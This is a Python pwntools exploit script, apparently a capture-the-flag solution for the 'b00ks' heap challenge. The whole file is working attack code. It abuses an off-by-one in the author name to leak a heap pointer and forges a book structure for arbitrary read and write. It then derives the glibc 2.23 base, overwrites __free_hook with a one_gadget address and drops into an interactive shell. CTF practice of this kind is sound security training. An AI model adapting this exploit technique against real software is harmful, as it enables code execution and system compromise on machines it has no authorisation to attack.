from pwn import *

context(os='linux', arch='amd64')
p = process('./b00ks')
# p = remote('node4.buuoj.cn', 28139)
elf = ELF('./b00ks')
libc = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')


def create(size1, book_name, size2, description):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'Enter book name size:')
    p.sendline(size1)
    p.recvuntil(b'Enter book name (Max 32 chars):')
    p.sendline(book_name)
    p.recvuntil(b'Enter book description size:')
    p.sendline(size2)
    p.recvuntil(b'Enter book description:')
    p.sendline(description)


def free(id):
    p.recvuntil(b'>')
    p.sendline(b'2')
    p.recvuntil(b'Enter the book id you want to delete:')
    p.sendline(id)


def edit(id, mess):
    p.recvuntil(b'>')
    p.sendline(b'3')
    p.recvuntil(b'Enter the book id you want to edit:')
    p.sendline(id)
    p.recvuntil(b'Enter new book description:')
    p.sendline(mess)


def print_book():
    p.recvuntil(b'>')
    p.sendline(b'4')


def change_name():
    p.recvuntil(b'>')
    p.sendline(b'5')
    p.recvuntil(b'Enter author name:')
    new_name = b'a' * 30 + b'bb'
    p.sendline(new_name)


p.recvuntil(b'Enter author name:')
payload = b'a' * 30 + b'bb'
p.sendline(payload)
name = b'book1'
message = b'a'
create(b'12', name, b'256', message)
name = b'book2'
create(b'12', name, b'135168', message)
print_book()
p.recvuntil(b'bb')
book_1_addr = u64(p.recv(6).ljust(8, b'\00'))
print(hex(book_1_addr))
mmap_addr = book_1_addr + 0x60
new_message = b'a' * 192
new_chunk = p64(1) + p64(mmap_addr - 8) + p64(mmap_addr) + p64(0xffff)
new_message += new_chunk
edit(b'1', new_message)
change_name()
print_book()
difference = 0x7f281d885010 - 0x7f281d2bb000
print(hex(difference))
p.recvuntil(b'Description:')
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - difference
print(hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']
print(hex(free_hook))
one_gadget = libc_base + 0x4526a
new_message = p64(free_hook)
edit(b'1', new_message)
new_message = p64(one_gadget)
edit(b'2', new_message)
# free(b'2')
p.interactive()
